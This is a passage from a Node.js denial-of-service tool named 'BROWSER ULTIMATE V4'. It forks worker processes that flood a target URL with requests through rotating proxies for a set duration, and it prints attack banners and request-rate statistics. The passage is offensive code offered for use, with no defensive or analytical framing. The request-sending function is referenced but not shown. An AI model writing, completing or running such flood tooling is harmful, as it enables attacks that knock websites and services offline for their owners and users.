    const endTime = Date.now() + (duration * 1000);
    
    while (Date.now() < endTime) {
        const batch = [];
        const batchSize = Math.min(threads, Math.max(1, threads - activeConnections));
        
        for (let i = 0; i < batchSize; i++) {
            batch.push(flood(getRandomProxy()));
        }
        
        await Promise.race([
            Promise.all(batch),
            new Promise(r => setTimeout(r, 50))
        ]);
    }
}

function formatBytes(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(2) + ' KB';
    if (bytes < 1073741824) return (bytes / 1048576).toFixed(2) + ' MB';
    return (bytes / 1073741824).toFixed(2) + ' GB';
}

if (cluster.isMaster) {
    console.clear();
    console.log(`
╔═══════════════════════════════════════════════════════════════════════════════╗
║     🔥 BROWSER ULTIMATE V4 - ATTACK INITIATED 🔥                              ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║ Target:    ${targetURL.substring(0, 65).padEnd(65)} ║
║ Duration:  ${String(duration + 's').padEnd(65)} ║
║ Threads:   ${String(threads).padEnd(65)} ║
║ Rate:      ${String(rates + '/conn').padEnd(65)} ║
║ Proxies:   ${String(proxies.length).padEnd(65)} ║
║ User-Agents: ${String(userAgents.length || 'Generated').padEnd(63)} ║
╚═══════════════════════════════════════════════════════════════════════════════╝
    `);

    for (let i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`[+] ${getCurrentTime()} | Worker ${i + 1} started`);
    }

    setInterval(getTargetStatus, 3000);

    setTimeout(() => {
        console.log(`\n[*] ${getCurrentTime()} | Attack completed!`);
        process.exit(0);
    }, duration * 1000);

} else {
    const startTime = Date.now();

    const statsInterval = setInterval(() => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.round(totalSent / elapsed);
        const successRate = totalSent > 0 ? ((totalSuccess / totalSent) * 100).toFixed(1) : 0;
        
        console.log(`[${getCurrentTime()}] Sent: ${totalSent} | Success: ${totalSuccess} (${successRate}%) | RPS: ${rps} | Data: ${formatBytes(bytesReceived)} | Active: ${activeConnections}`);
    }, 2000);

    startFlooding().then(() => {
        clearInterval(statsInterval);
        const elapsed = (Date.now() - startTime) / 1000;
        const avgRps = Math.round(totalSent / elapsed);
        
        console.log(`
╔═══════════════════════════════════════════════════════════════════════════════╗
║     📊 WORKER FINAL STATISTICS                                                ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║ Total Requests:  ${String(totalSent).padEnd(60)} ║
║ Success:         ${String(totalSuccess).padEnd(60)} ║
║ Errors:          ${String(totalErrors).padEnd(60)} ║
║ Avg RPS:         ${String(avgRps).padEnd(60)} ║
║ Data Received:   ${String(formatBytes(bytesReceived)).padEnd(60)} ║
╚═══════════════════════════════════════════════════════════════════════════════╝
        `);
        process.exit(0);
    });
}
